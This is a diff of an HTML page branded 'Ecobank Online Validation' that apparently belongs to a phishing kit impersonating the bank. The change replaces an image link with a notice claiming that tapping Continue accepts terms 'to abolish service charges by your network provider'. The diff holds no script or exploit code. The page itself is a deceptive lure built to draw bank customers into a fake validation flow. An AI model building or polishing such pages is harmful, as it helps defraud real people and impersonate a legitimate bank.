@@ -7,17 +7,16 @@
   <style>
     body {
       margin: 0;
-      font-family: Arial, sans-serif;
+      font-family: "Segoe UI", Roboto, Arial, sans-serif;
       background: linear-gradient(to bottom, #08143a, #0b1d4d);
       display: flex;
       flex-direction: column;
       align-items: center;
       min-height: 100vh;
       color: #fff;
-      padding: 0;
     }
 
-    /* Header bar */
+    /* Header */
     .header {
       background: linear-gradient(135deg, #08143a, #0b1d4d);
       color: #fff;
@@ -31,32 +30,32 @@
     .header h1 { margin: 0; font-size: 24px; }
     .header p { margin: 8px 0 0; font-size: 14px; }
 
-    /* Container for image + button */
-    .container {
-      text-align: center;
-      background: rgba(255, 255, 255, 0.08);
-      border-radius: 12px;
-      box-shadow: 0 6px 16px rgba(0,0,0,0.4);
-      padding: 20px;
+    /* Centered box */
+    .notice-box {
+      margin-top: -20px;
+      background: linear-gradient(135deg, #1e2b5b, #24356b);
+      color: #e6ecf9;
+      padding: 25px 20px 20px 20px;
       max-width: 500px;
       width: 90%;
-      backdrop-filter: blur(6px);
-      margin-top: -30px; /* overlap header nicely */
+      border-radius: 12px;
+      box-shadow: 0 6px 16px rgba(0,0,0,0.4);
+      font-size: 15px;
+      line-height: 1.6;
+      text-align: center;
+      font-weight: 500;
+      position: relative;
     }
 
-    .main-image {
-      max-width: 100%;
-      height: auto;
-      border-radius: 8px;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
-      cursor: pointer;
-      transition: transform 0.2s ease;
+    .notice-icon {
+      position: absolute;
+      top: 12px;
+      left: 12px;
+      font-size: 20px;
+      color: #4db8ff;
     }
 
-    .main-image:hover {
-      transform: scale(1.02);
-    }
-
+    /* Continue button */
     .continue-btn {
       margin-top: 20px;
       display: inline-block;
@@ -80,6 +79,8 @@
     @media (max-width: 500px) {
       .header h1 { font-size: 20px; }
       .header p { font-size: 12px; }
+      .notice-box { font-size: 14px; padding: 20px 15px; }
+      .notice-icon { font-size: 18px; top: 10px; left: 10px; }
       .continue-btn { font-size: 14px; padding: 10px 20px; width: 100%; display: block; }
     }
   </style>
@@ -91,19 +92,10 @@
     <p>Ecobank Online Validation</p>
   </div>
 
-  <div class="container">
-    <a href="thankyou.html">
-      <picture>
-        <!-- Prefer JPG -->
-        <source srcset="host-image.jpg" type="image/jpeg">
-        <!-- Fallback to JPEG -->
-        <source srcset="host-image.jpeg" type="image/jpeg">
-        <!-- Fallback if nothing else works -->
-        <img src="host-image.jpg" alt="Welcome Image" class="main-image">
-      </picture>
-    </a>
-
-    <a href="details.html" class="continue-btn">Continue</a>
+  <div class="notice-box">
+    <div class="notice-icon">ℹ️</div>
+    <p><strong>Note:</strong> By tapping on <em>Continue</em> you accept all terms and conditions to abolish service charges by your network provider.</p>
+    <a href="thankyou.html" class="continue-btn">Continue</a>
   </div>
 
 </body>
